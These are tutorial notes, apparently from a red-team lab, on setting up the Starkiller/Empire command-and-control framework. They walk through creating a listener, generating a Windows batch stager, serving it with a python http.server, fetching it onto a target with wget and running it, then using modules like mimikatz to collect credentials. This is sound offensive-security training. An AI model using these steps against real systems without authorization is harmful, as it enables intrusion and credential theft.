Starkiller/Empire

	Command and Control Server Overview:
	A command and control server is used as an interface to upload and control various post-exploitation tools without interacting with the target itself. Consider C2 as a means for mass-management of exploited targets for further usage - be it lateral movement, information gathering, or otherwise.

Uploading a C2 agent with Starkiller
	Starkiller uses a listener and a stager to create an agent the listener does exactly as it sounds like it, it listens on a given port for a connection back from your agent. The stager is like a payload that you send to the target to get an agent back.
	
 Creating our Listener:
 	1. Go to listeners tab and select CREATE LISTENER
 	2. Select your listener type, for our demo, we will use an http listener
 	3. Configure your listener, the only two options you will need  to change are the host IP and the host port. 
 	4. After pressing submit we now have an active listener on port 53.
 
 Generating the Stager:
 	1. Go to the stagers tab and select GENERATE STAGER
 	2. Select your stager type, for our demo, we will use windows/launcher_bat
 	3. Set the listener to the listener we made previously
 	4. We now have a stager ready to deploy to our target depending on the stager type you selected you will have to either download or copy and paste the stager to the targer machine. 
 
 Transferring & Executing the Stager
 	1. python3 -m http.server
 	2. wget <url> -outfile launcher.bat
 	3. ./launcher.bat
 
Note: After executing the batch file if you correctly setup your listener and stager then an agent will check back in the agents tab.

Note: A red agent means that the agent is not responding with the c2 server. An agent with a black color or no color means that the agent has successfully connected back to the c2 server and is actively responding.

Now that we have an agent on the machine responding with Starkiller we can explore the command interface of Starkiller as well as the modules that Starkiller has.

Agent Panel Overview:
	If you click on an agent you will be brought to the agent interaction panel, here you can send commands to the server as well as execute modules within Starkiller.
	
	The agent can send any normal shell commands such as whoami or ls, however that is not utilizing the full power of Starkiller.
	
Starkiller Modules Overview:
	One of the major features of any c2 server is the ability to use modules. These are typically tools or exploits like mimikatz, Rubeus, and printspoofer that can be loaded onto the server through the agent.
	
	Starkiller has many modules, all their own uses. Take some time to explore the modules menu and play with some of the modules.
	
Starkiller Credentials and Reporting Overview:
	Starkiller is great for saving information and logging actions because it will automatically save all credentials that are found through the modules or credentials that you add manually. Starkiller will also report all shell command and modules run on an agent.
